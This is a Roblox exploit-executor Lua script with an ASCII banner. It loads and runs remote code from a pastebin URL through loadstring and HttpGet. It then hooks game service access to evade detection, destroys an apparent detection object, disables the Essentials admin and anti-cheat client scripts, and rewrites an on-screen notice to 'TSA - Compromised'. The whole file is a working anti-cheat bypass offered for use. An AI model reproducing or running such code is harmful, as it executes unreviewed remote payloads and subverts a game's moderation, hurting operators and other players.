local PR= [[
███████╗░░░░█████╗░░░░  ░██████╗██╗░░░██╗░██████╗████████╗███████╗███╗░░░███╗
██╔════╝░░░██╔══██╗░░░  ██╔════╝╚██╗░██╔╝██╔════╝╚══██╔══╝██╔════╝████╗░████║
█████╗░░░░░███████║░░░  ╚█████╗░░╚████╔╝░╚█████╗░░░░██║░░░█████╗░░██╔████╔██║
██╔══╝░░░░░██╔══██║░░░  ░╚═══██╗░░╚██╔╝░░░╚═══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║
██║░░░░░██╗██║░░██║██╗  ██████╔╝░░░██║░░░██████╔╝░░░██║░░░███████╗██║░╚═╝░██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝  ╚═════╝░░░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝
]]
local h;local sgui = Instance.new('ScreenGui',game:GetService('CoreGui'));local tl1 = Instance.new('TextLabel',sgui);tl1.Text=PR
tl1.TextColor3 = Color3.fromRGB(255,255,255);tl1.TextScaled = true;tl1.Size = UDim2.new(0,500,0,500);tl1.BackgroundTransparency=1;tl1.TextStrokeTransparency=0;tl1.TextStrokeColor3=Color3.fromRGB(0, 255, 125)
print('\n'..PR..'\n All Rights Reserved. ©2020')
if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end
h = game:AddGlobalGetHook("Disabled", false)
game:AddGetHook("JointsService", function(t) warn("Attempt to get JointsService!") return game.ReplicatedStorage
end)
game:GetService('JointsService').Name = 'CON'
game:GetService('JointsService')['what is this please go away do not look inside me asldkfjha;lsodkfhjapo[ifusdapk;losdnflansd;lma,']:Destroy()
wait()
game:GetService('Players').LocalPlayer.PlayerScripts['Essentials Code'].Disabled = true
game:GetService('Players').LocalPlayer.PlayerGui['Essentials Client']['Base Clip']['List Template'].ScrollingFrame.Template.LocalScript.Disabled = true
local st,msg = pcall(function()
game:GetService('Players').LocalPlayer.PlayerGui['Essentials Client']['Base Clip'].Container['Notif Clone'].Inner.Controls.Decoration.Title.Text = "TSA - Compromised"
game:GetService('Players').LocalPlayer.PlayerGui['Essentials Client']['Base Clip'].Container['Notif Clone'].Inner.Desc.Text = "[REDACTED]"
end)
